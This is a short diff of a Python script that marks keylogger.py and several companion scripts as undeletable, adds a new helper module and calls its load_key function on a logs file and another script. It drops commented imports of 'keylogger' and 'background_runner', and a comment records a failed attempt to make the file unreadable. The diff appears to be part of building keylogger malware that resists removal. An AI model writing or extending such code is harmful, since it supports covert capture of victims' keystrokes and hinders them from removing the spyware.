@@ -1,8 +1,5 @@
 import os
-# import keylogger
-# import background_runner
-# import test
-# import test1
+import test2
 
 def make_file_undeletable(filepath):
     try:
@@ -17,10 +14,12 @@ if __name__ == "__main__":
     make_file_undeletable("keylogger.py")
     make_file_undeletable("test.py")
     make_file_undeletable("test1.py")
+    make_file_undeletable("test2.py")
+    test2.load_key("logs.txt")
+    test2.load_key("test1.py")
     
     
     
     
     
-    
-# Failed can't ,ake file unreadble 
+# Failed can't make file unreadble 
